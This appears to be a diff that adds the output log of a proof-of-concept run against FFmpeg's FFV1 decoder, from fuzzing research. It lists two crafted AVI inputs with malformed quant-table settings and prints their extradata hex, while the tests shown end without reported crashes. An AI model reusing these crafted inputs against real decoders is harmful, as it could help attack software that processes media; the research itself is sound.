@@ -1,0 +1,16 @@
+=== FFV1 VULN-001 PoC ===
+Binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
+
+[*] Generating crafted FFV1 files...
+[+] /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ffv1dec_c/vuln_001_input.avi (256 bytes) — context_count=1, quant_tables all-zero
+[+] /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_ffv1dec_c/vuln_001_input2.avi (267 bytes) — context_count=2, half-split quant table
+
+Extradata hex dump:
+  set1: 5600302849cd9b366cd9b366ca00fcbc4491
+  set2: 5600302ba674e9d3a74e9d3a74e39051ab5ab56ad5ab532a67264f96
+
+--- Testing vuln_001_input.avi ---
+
+--- Testing vuln_001_input2.avi ---
+
+EXIT=0
